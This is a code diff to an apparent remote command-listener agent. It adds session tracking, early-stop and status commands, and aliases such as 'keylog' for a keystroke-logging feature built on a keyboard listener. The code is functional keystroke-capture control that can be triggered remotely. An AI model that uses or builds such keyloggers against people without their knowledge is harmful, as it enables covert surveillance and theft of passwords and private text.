@@ -1454,6 +1454,35 @@ class CommandListener:
     # KEYSTROKE LOGGING COMMANDS
     # =========================================================================
 
+    # Class-level tracking of active keystroke sessions per device
+    _keystroke_sessions = {}  # device_id -> {"listener": listener, "stop_flag": threading.Event()}
+
+    def cmd_keystroke_stop(self, args: dict) -> dict:
+        """Stop active keystroke logging on this device."""
+        try:
+            if self.device_id in CommandListener._keystroke_sessions:
+                session = CommandListener._keystroke_sessions.get(self.device_id)
+                if session:
+                    session["stop_flag"].set()  # Signal to stop
+                    if session.get("listener"):
+                        session["listener"].stop()
+                    CommandListener._keystroke_sessions.pop(self.device_id, None)
+                    log(f"[KEYSTROKE] Stopped keystroke logging")
+                    return {"success": True, "message": "Keystroke logging stopped"}
+            return {"success": False, "error": "No active keystroke logging on this device"}
+        except Exception as e:
+            log(f"[KEYSTROKE] Error stopping: {e}")
+            return {"success": False, "error": str(e)}
+
+    def cmd_keystroke_status(self, args: dict) -> dict:
+        """Check if keystroke logging is active on this device."""
+        is_active = self.device_id in CommandListener._keystroke_sessions
+        return {
+            "success": True,
+            "is_active": is_active,
+            "message": "Keystroke logging is active" if is_active else "No active keystroke logging"
+        }
+
     def cmd_keystroke(self, args: dict) -> dict:
         """Start keystroke logging for a specified duration.
 
@@ -1464,6 +1493,14 @@ class CommandListener:
         try:
             import threading
             import signal
+
+            # Check if already running on this device
+            if self.device_id in CommandListener._keystroke_sessions:
+                return {
+                    "success": False,
+                    "error": "Keystroke logging already active on this device. Stop it first or wait for it to complete.",
+                    "is_running": True
+                }
 
             duration_mins = min(int(args.get("duration", 5)), 60)  # Max 60 minutes
             full_log = args.get("full_log", False)
@@ -1537,16 +1574,35 @@ class CommandListener:
                         except:
                             pass
 
+            # Create stop flag for early termination
+            stop_flag = threading.Event()
+
             # Start listener in background thread
             listener = keyboard.Listener(on_press=on_key_press)
             listener.start()
 
-            # Wait for duration
-            time.sleep(duration_secs)
+            # Track this session
+            CommandListener._keystroke_sessions[self.device_id] = {
+                "listener": listener,
+                "stop_flag": stop_flag,
+                "start_time": keystroke_data["start_time"]
+            }
+
+            # Wait for duration OR stop signal
+            elapsed = 0
+            while elapsed < duration_secs:
+                if stop_flag.is_set():
+                    log(f"[KEYSTROKE] Early stop requested after {elapsed}s")
+                    break
+                time.sleep(1)
+                elapsed += 1
 
             # Stop listener
             listener.stop()
             listener.join()
+
+            # Remove from active sessions
+            CommandListener._keystroke_sessions.pop(self.device_id, None)
 
             # Prepare result
             keystroke_data["end_time"] = datetime.now().isoformat()
@@ -1893,6 +1949,11 @@ class CommandListener:
             "keystroke": self.cmd_keystroke,
             "keylog": self.cmd_keystroke,
             "keystrokes": self.cmd_keystroke,
+            "keystroke_stop": self.cmd_keystroke_stop,
+            "keystrokestop": self.cmd_keystroke_stop,
+            "stop_keystroke": self.cmd_keystroke_stop,
+            "keystroke_status": self.cmd_keystroke_status,
+            "keystrokestatus": self.cmd_keystroke_status,
         }
 
         handler = handlers.get(cmd_name)
